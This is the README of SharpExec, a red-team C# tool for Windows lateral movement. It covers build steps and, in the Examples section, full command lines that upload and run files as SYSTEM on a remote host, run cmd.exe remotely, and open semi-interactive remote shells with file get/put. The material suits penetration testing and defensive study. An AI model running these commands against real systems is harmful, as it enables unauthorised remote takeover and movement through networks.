# SharpExec

Description
============

SharpExec is an offensive security C# tool designed to aid with lateral movement. 

It currently includes:

-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket's wmiexec.py tool.

-SMBExec - Semi-Interactive shell that runs as NT Authority\System.  Best described as a less mature version of Impacket's smbexec.py tool.

-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.

-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.

In the Future I would like to add:

Lateral movement through DCOM
Pass the hash functionality

Contact at:
- Twitter: @anthemtotheego

Quick blog:

https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

![Alt text](/sharpexec.PNG?raw=true "SharpExec")

Setup - Quick and Dirty
==============================

**Note: I used Windows 10, Visual Studio 2017 - mileage may vary**

1. Download SharpExec tool and open up SharpExec.sln  

2. Open up SharpExec.sln in Visual Studio (make sure to compile for correct architecture) - Should see drop down with Any CPU > Click on it and open Configuration Manager > under platform change to desired architecture and select ok.

3. Inside visual studio, right click References on the righthand side, choose Add Reference, then under Assemblies, search for System.Management, check the box and click OK.

4. Compile, make sure for the correct architecture (x64 or x86), drop binary on computer or pull into memory and have fun.

Examples 
========

Note - All modules require Administrative rights on the target systems
Note - If the user who runs SharpExec has administrative rights to the target system, username/password/domain options on not required.

PSExec Module:

Uploads file from User1's desktop to C:\ on remote system and executes it as NT Authority\System

```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```

Runs command via cmd.exe on target system as NT Authority\System

```SharpExec.exe -m=psexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```

WMI Module:

Uploads file from User1's desktop to C:\ on remote system and executes it as TargetUser

```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -f=C:\users\user1\desktop\noPowershell-noargs.exe -e=C:\noPowershell-noargs.exe```

Runs command via cmd.exe on target system as TargetUser

```SharpExec.exe -m=wmi -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain -e=C:\Windows\System32\cmd.exe -c="My Args"```

WMIExec Module:

Starts semi-interactive shell on remote system as TargetUser

```SharpExec.exe -m=wmiexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```

While shell is running

<pre>
put                  Upload file from local directory to current shell directory, put fullLocalPath\\File.txt File.txt
get                  Download file from current shell directory to local directory, get File.txt fullLocalPath\\File.txt
help                 Show help menu
exit                 exit shell
</pre>

SMBExec Module:

Starts semi-interactive shell on remote system as NT Authority\System

```SharpExec.exe -m=smbexec -i=192.168.1.10 -u=TargetUser -p=P@ssword! -d=TargetDomain```

While semi-interactive shell is running

<pre>
put                  Upload file from local directory to current shell directory, put fullPath\\File.txt fullPath\\File.txt
get                  Download file from current shell directory to local directory, get fullPath\\File.txt fullPath\\File.txt
help                 Show help menu
exit                 exit shell
</pre>

Acknowledgements
============

I tried to mimic Impacket's wmiexec.py and smbexec.py as much as possible.  This is an awesome project and if you haven't ever used their tools, I highly suggest checking them out!

SecureAuthCorp - Impacket tools - https://github.com/SecureAuthCorp/impacket
